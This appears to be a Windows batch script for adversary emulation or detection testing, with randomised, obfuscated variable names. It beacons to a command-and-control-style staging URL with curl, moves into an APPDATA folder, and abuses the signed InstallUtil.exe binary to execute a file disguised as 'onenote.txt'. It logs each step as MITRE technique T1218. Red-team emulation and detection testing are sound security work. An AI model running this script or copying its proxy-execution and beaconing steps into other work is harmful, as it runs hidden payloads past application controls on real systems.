@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET pjkcpgw=%APPDATA%\9436\6217fbc0
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?9436-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=onenote.txt
SET ewjmdkff=9436
SET logpcs=%APPDATA%\!pudaazx!\macula-simulations.log
SET wrmpq=c2heartbeat
SET skqvh=chdir
SET zmxcd=exec_installutil

echo [%DATE% %TIME%][DEBUG][!hlbnp!]: operation=!wrmpq!_start>> "!logpcs!" 2>nul
curl -k -s -o nul "!drguvr!"
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: operation=!wrmpq!_complete>> "!logpcs!" 2>nul

echo [%DATE% %TIME%][DEBUG][!hlbnp!]: operation=!skqvh!_start>> "!logpcs!" 2>nul
cd /d "!pjkcpgw!" >nul 2>&1
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: operation=!skqvh!_complete>> "!logpcs!" 2>nul

SET ttpresult=1
SET ttpdetail=
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: operation=!zmxcd!_start>> "!logpcs!" 2>nul
%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "!syjfr!" >nul 2>&1
IF !ERRORLEVEL! NEQ 0 (
SET ttpresult=0
SET ttpdetail=installutil_failed
)
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: operation=!zmxcd!_complete>> "!logpcs!" 2>nul

SET ttpdate=!DATE:/=-!
SET tttime=!TIME: =0!
SET ttpstamp=!ttpdate! !tttime:~0,12!
echo [!ttpstamp!][!hlbnp!]: !pudaazx!-!ewjmdkff!-T1218|Signed Binary Proxy Execution=!ttpresult!:!ttpdetail!>> "!logpcs!" 2>nul
ENDLOCAL